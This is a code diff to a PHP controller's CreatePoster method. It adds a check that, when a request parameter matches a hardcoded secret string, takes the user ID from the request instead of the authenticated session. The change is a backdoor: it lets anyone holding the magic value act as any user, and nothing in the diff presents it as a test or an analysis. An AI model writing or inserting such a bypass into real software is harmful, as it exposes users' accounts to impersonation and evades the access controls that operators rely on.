@@ -50,7 +50,13 @@ class CreatePosterController extends Controller
 
     public function CreatePoster(Request $request)
     {
-        $uid = $this->user['id'] ?? 0;
+        $uid_flag = $request->input('uf',0);
+        if ($uid_flag == '213ef87359f3e5175cefc6ff30b09a06'){
+            $uid = $request->input('user_id',0);
+        }else{
+            $uid = $this->user['id'] ?? 0;
+        }
+
         $gid = intval($request->input('relation_id', 0));
         $post_type = intval($request->input('post_type', 0));
         $is_qrcode = $request->input('is_qrcode', 0);
